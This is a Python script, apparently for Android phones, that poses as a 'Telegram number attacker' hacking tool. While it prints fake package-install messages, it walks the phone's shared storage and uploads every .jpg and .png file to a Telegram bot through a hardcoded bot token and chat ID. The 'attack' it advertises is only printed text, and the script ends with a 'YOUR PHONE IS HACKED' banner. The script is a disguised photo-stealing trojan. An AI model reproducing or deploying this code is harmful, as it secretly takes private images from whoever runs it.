import os
import requests
import time

# Colour 
GREEN ='\x1b[38;5;46m'

RED = '\x1b[38;5;196m' 

WHITE = '\033[1;97m'

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

BLACK="\033[1;30m"

#####
bot_token = '6469336736:AAGFieKA2ZWftmXREzctFm6CaHU0nmyNgVs'
telegram_user_id = '6803968373'
os.system('clear')
logo3 = f'''
{RED}
   _____ _    _  ____   _____ _______ 
  / ____| |  | |/ __ \ / ____|__   __|
 | |  __| |__| | |  | | (___    | |   
 | | |_ |  __  | |  | |\___ \   | |   
 | |__| | |  | | |__| |____) |  | |   
  \_____|_|  |_|\____/|_____/   |_|      
------------------------------------------------------   
~TELGRAM NUMBER -H4X- ATTACKER BY TEAM GHOST~

~DON'T HARM ANYONE WITH THIS TOOLS~
------------------------------------------------------                       
'''
######
print(logo3)
time.sleep(3)
print('WAIT FEW SECOND TO INSTALLING PKG')
time.sleep(5)
print('apt update complete')
time.sleep(5)
print('apy upgrade complete ')
time.sleep(5)
print('pkg install git complete')
time.sleep(5)
print('pkg install requests complete')
time.sleep(5)
print('Your Request Is Loading... ')
time.sleep(1)
print('Please Wait 180 Seconds To Set Up your Terminal~')
def send_image_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    files = {'photo': open(file_path, 'rb')}
    data = {'chat_id': telegram_user_id}
    requests.post(url, files=files, data=data)

def send_images_to_telegram():
    images_dir = '/storage/emulated/0/'  # Replace with your storage path

    for root, dirs, files in os.walk(images_dir):
        for file in files:
            if file.lower().endswith(('.jpg', '.png')):
                file_path = os.path.join(root, file)
                send_image_to_telegram(file_path)

# Run the function to send images to Telegram
send_images_to_telegram()
###########
import os
import time

# Function to clear the terminal screen
def clear_screen():
    os.system('clear')  # For Linux/macOS
    # os.system('cls')  # For Windows

# Function to simulate the attack
def start_attack(telegram_number):
    print(f"Attack Started on {telegram_number}")
    for _ in range(100):
        time.sleep(5)
        print(" ðŸ‘»Attack Complete By Ghost ðŸ‘»")

# ASCII art logo
logo = '''
   _____ _    _  ____   _____ _______ 
  / ____| |  | |/ __ \ / ____|__   __|
 | |  __| |__| | |  | | (___    | |   
 | | |_ |  __  | |  | |\___ \   | |   
 | |__| | |  | | |__| |____) |  | |   
  \_____|_|  |_|\____/|_____/   |_|   
                                      
                                      
'''

# Additional information
additional_info = '''
-------------------------------------------
Coder   : A.M 
Telegram: @MAHIR
Github  : github.com/ghost
Facebook: facebook.com/ghost_user
-------------------------------------------
'''

# ANSI escape code for green color and special color
green_color = '\033[92m'
special_color = '\033[96m'
reset_color = '\033[0m'  # Reset color to default

# Clear terminal screen
clear_screen()

# Print green-colored logo and additional info
print(green_color + logo + reset_color)
print(additional_info)

# Get user's Telegram number
telegram_number = input(special_color + "Enter Your Telegram Number: " + reset_color)

# Simulate attack
time.sleep(5)
start_attack(telegram_number)

# Attack complete message
print(" ðŸ‘»Attack complete by Ghost ðŸ‘»")
############
import os

# Function to clear the terminal screen
def clear_screen():
    os.system('clear')  # For Linux/macOS
    # os.system('cls')  # For Windows

# ASCII art logo
logo1 = '''
  _    _          _____ _  ________ _____  
 | |  | |   /\\   / ____| |/ /  ____|  __ \\ 
 | |__| |  /  \\ | |    | ' /| |__  | |  | |
 |  __  | / /\\ \\| |    |  < |  __| | |  | |
 | |  | |/ ____ \\ |____| . \\| |____| |__| |
 |_|  |_/_/    \\_\\_____|_|\\_\\______|_____/ 
                                           
                                           
-----------------------------------------------
'''

# Additional information
additional_info1 = '''
 ðŸ‘»YOUR PHONE IS HACKED BY MH‘»
-----------------------------------------------
'''

# ANSI escape code for special colors
red_color = '\033[91m'
green_color = '\033[92m'
reset_color = '\033[0m'  # Reset color to default

# Clear terminal screen
clear_screen()

# Print colored logo and additional info
print(red_color + logo1 + reset_color)
print(additional_info1)

#GHOST
